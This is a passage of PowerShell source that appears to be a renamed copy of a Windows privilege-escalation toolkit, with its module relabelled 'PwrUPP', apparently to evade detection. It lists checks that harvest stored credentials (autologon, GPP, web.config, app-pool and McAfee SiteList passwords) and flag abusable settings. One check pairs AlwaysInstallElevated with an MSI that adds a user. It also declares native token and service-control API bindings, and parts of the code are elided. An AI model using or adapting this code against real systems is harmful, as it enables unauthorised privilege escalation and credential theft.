        @{Type='AlwaysInstallElevated Registry Key';AbuseScript={ 'Write-UserAddMSI' };Command={ if (Get-RegistryAlwaysInstallElevated){ New-Object PSObject } };},
        @{Command={ Get-RegistryAutoLogon };Type='Registry Autologons';},
        @{Command={ Get-ModifiableRegistryAutoRun };Type='Modifiable Registry Autorun';},

        @{Type='Modifiable Scheduled Task Files';Command={ Get-ModifiableScheduledTaskFile };},
        @{Type='Unattended Install Files';Command={ Get-UnattendedInstallFile };},
        @{Command={ Get-WebConfig | Where-Object {$_} };Type='Encrypted web.config Strings';},
        @{Type='Encrypted Application Pool Passwords';Command={ Get-ApplicationHost | Where-Object {$_} };},
        @{Command={ Get-SiteListPassword | Where-Object {$_} };Type='McAfee SiteList.xml files';},
        @{Command={ Get-CachedGPPPassword | Where-Object {$_} };Type='Cached GPP Files';}
    ))

    ForEach($Check in $Checks){
        Write-Verbose "Checking for $($Check.Type)..."
        Set-Variable -Name Results -Value (. $Check.Command)
...
Set-Variable -Name Module -Value (New-InMemoryModule -ModuleName PwrUPPModule)


Set-Variable -Name FunctionDefinitions -Value (@(
    (func kernel32 GetCurrentProcess ([IntPtr]) @()),
    (func kernel32 OpenProcess ([IntPtr]) @([UInt32], [Bool], [UInt32]) -SetLastError),
    (func kernel32 CloseHandle ([Boolean]) @([IntPtr]) -SetLastError),
    (func advapi32 OpenProcessToken ([Boolean]) @([IntPtr], [UInt32], [IntPtr].MakeByRefType()) -SetLastError)
    (func advapi32 GetTokenInformation ([System.Boolean]) @([IntPtr], [UInt32], [IntPtr], [UInt32], [UInt32].MakeByRefType()) -SetLastError),
    (func advapi32 ConvertSidToStringSid ([Int32]) @([IntPtr], [String].MakeByRefType()) -SetLastError),
    ...
    (func advapi32 ChangeServiceConfig ([Bool]) @([IntPtr], [UInt32], [UInt32], [UInt32], [String], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) -Charset Unicode -SetLastError),
    (func advapi32 CloseServiceHandle ([Bool]) @([IntPtr]) -SetLastError),
    (func ntdll RtlAdjustPrivilege ([UInt32]) @([Int32], [Bool], [System.Boolean], [Int32].MakeByRefType()))
))


Set-Variable -Name ServiceAccessRights -Value (psenum $Module PwrUPP.ServiceAccessRights UInt32 @{GenericWrite='0x40000000';ReadControl='0x00020000';QueryConfig='0x00000001';GenericExecute='0x20000000';GenericAll='0x10000000';QueryStatus='0x00000004';Delete='0x00010000';AllAccess='0x000F01FF';AccessSystemSecurity='0x01000000';WriteOwner='0x00080000';PauseContinue='0x00000040';Start='0x00000010';Interrogate='0x00000080';WriteDac='0x00040000';Synchronize='0x00100000';EnumerateDependents='0x00000008';GenericRead='0x80000000';ChangeConfig='0x00000002';Stop='0x00000020';UserDefinedControl='0x00000100';} -Bitfield)

Set-Variable -Name SidAttributes -Value (psenum $Module PwrUPP.SidAttributes UInt32 @{SE_GROUP_ENABLED='0x00000004';SE_GROUP_MANDATORY='0x00000001';SE_GROUP_ENABLED_BY_DEFAULT='0x00000002';SE_GROUP_USE_FOR_DENY_ONLY='0x00000010';SE_GROUP_RESOURCE='0x20000000';SE_GROUP_OWNER='0x00000008';SE_GROUP_INTEGRITY_ENABLED='0xC0000000';SE_GROUP_INTEGRITY='0x00000020';} -Bitfield)

Set-Variable -Name LuidAttributes -Value (psenum $Module PwrUPP.LuidAttributes UInt32 @{SE_PRIVILEGE_ENABLED_BY_DEFAULT='0x00000001';SE_PRIVILEGE_ENABLED='0x00000002';DISABLED='0x00000000';SE_PRIVILEGE_REMOVED='0x00000004';SE_PRIVILEGE_USED_FOR_ACCESS='0x80000000';} -Bitfield)

Set-Variable -Name SecurityEntity -Value (psenum $Module PwrUPP.SecurityEntity UInt32 @{SeDebugPrivilege=20;SeRelabelPrivilege=32;SeTakeOwnershipPrivilege=9;SeSecurityPrivilege=8;SeProfileSingleProcessPrivilege=13;SeAssignPrimaryTokenPrivilege=2;SeManageVolumePrivilege=28;SeCreateTokenPrivilege=1;SeSystemtimePrivilege=12;SeAuditPrivilege=21;SeRemoteShutdownPrivilege=24;SeTcbPrivilege=7;SeIncreaseQuotaPrivilege=4;SeCreatePermanentPrivilege=16;SeLoadDriverPrivilege=10;SeShutdownPrivilege=19;SeUndockPrivilege=25;SeCreateSymbolicLinkPrivilege=35;SeSystemEnvironmentPrivilege=22;SeUnsolicitedInputPrivilege=5;SeMachineAccountPrivilege=6;SeSyncAgentPrivilege=26;SeCreateGlobalPrivilege=30;SeLockMemoryPrivilege=3;SeCreatePagefilePrivilege=15;SeImpersonatePrivilege=29;SeTrustedCredManAccessPrivilege=31;SeSystemProfilePrivilege=11;SeIncreaseBasePriorityPrivilege=14;SeChangeNotifyPrivilege=23;SeTimeZonePrivilege=34;SeIncreaseWorkingSetPrivilege=33;SeRestorePrivilege=18;SeEnableDelegationPrivilege=27;SeBackupPrivilege=17;})

Set-Variable -Name SID_AND_ATTRIBUTES -Value (struct $Module PwrUPP.SidAndAttributes @{Attributes=field 1 UInt32;Sid=field 0 IntPtr;})

Set-Variable -Name TOKEN_TYPE_ENUM -Value (psenum $Module PwrUPP.TokenTypeEnum UInt32 @{Impersonation=2;Primary=1;})

Set-Variable -Name TOKEN_TYPE -Value (struct $Module PwrUPP.TokenType @{Type=field 0 $TOKEN_TYPE_ENUM;})

Set-Variable -Name SECURITY_IMPERSONATION_LEVEL_ENUM -Value (psenum $Module PwrUPP.ImpersonationLevelEnum UInt32 @{Impersonation=2;Identification=1;Anonymous=0;Delegation=3;})

Set-Variable -Name IMPERSONATION_LEVEL -Value (struct $Module PwrUPP.ImpersonationLevel @{ImpersonationLevel=field 0 $SECURITY_IMPERSONATION_LEVEL_ENUM;})

Set-Variable -Name TOKEN_GROUPS -Value (struct $Module PwrUPP.TokenGroups @{GroupCount=field 0 UInt32;Groups=field 1 $SID_AND_ATTRIBUTES.MakeArrayType() -MarshalAs @('ByValArray', 32);})

Set-Variable -Name LUID -Value (struct $Module PwrUPP.Luid @{LowPart=field 0 $SecurityEntity;HighPart=field 1 Int32;})

Set-Variable -Name LUID_AND_ATTRIBUTES -Value (struct $Module PwrUPP.LuidAndAttributes @{Luid=field 0 $LUID;Attributes=field 1 UInt32;})

Set-Variable -Name TOKEN_PRIVILEGES -Value (struct $Module PwrUPP.TokenPrivileges @{PrivilegeCount=field 0 UInt32;Privileges=field 1 $LUID_AND_ATTRIBUTES.MakeArrayType() -MarshalAs @('ByValArray', 50);})

Set-Variable -Name Types -Value ($FunctionDefinitions | Add-Win32Type -Namespace 'PwrUPP.NativeMethods' -Module $Module)
Set-Variable -Name Advapi32 -Value ($Types['advapi32'])
Set-Variable -Name Kernel32 -Value ($Types['kernel32'])
Set-Variable -Name NTDll -Value ($Types['ntdll'])
